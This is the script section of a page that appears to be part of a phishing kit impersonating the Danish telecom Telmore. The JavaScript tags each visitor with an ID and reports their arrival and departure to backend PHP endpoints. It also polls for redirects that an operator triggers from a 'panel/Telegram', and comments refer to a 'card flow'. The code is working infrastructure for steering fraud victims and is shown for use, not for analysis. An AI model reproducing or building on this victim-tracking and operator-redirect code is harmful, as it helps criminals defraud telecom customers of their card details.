    <script>
        // Generate or get customer ID
        function getCustomerId() {
            let customerId = localStorage.getItem('customer_id');
            if (!customerId) {
                customerId = 'cid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('customer_id', customerId);
            }
            return customerId;
        }

        const customerId = getCustomerId();

        // Initialize active customer tracking
        function initActiveCustomer() {
            fetch('init_customer.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `customer_id=${encodeURIComponent(customerId)}&page=auth.html`
            }).catch(err => {
                console.error('Error initializing customer:', err);
            });
        }

        // Initialize on page load
        initActiveCustomer();

        // Send notification to send3.php when entering auth.html (only if not coming from app.html)
        // send3.php is already called from app.html in the card flow
        const referrer = document.referrer;
        if (!referrer.includes('app.html')) {
            fetch('send3.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'message=THIS IS IN AUTH.HTML'
            }).catch(err => {
                console.error('Error sending to send3.php:', err);
            });
        }

        // Check for redirect from panel/Telegram
        function checkRedirect() {
            fetch('check_telmore_redirect.php?customer_id=' + encodeURIComponent(customerId))
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    } else {
                        setTimeout(checkRedirect, 800);
                    }
                })
                .catch(error => {
                    console.error('Error checking redirect:', error);
                    setTimeout(checkRedirect, 800);
                });
        }

        // Start polling for redirects immediately
        checkRedirect();

        // Banned button - redirect to telmore.dk
        document.getElementById('bannedBtn').addEventListener('click', function() {
            window.location.href = 'https://telmore.dk';
        });

        // Keep user on auth.html - no automatic redirect to app.html

        // Send exit notification when client leaves
        window.addEventListener('beforeunload', function() {
            const formData = new FormData();
            formData.append('customer_id', customerId);
            navigator.sendBeacon('send_exit_notification.php', formData);
        });
    </script>
</body></html>
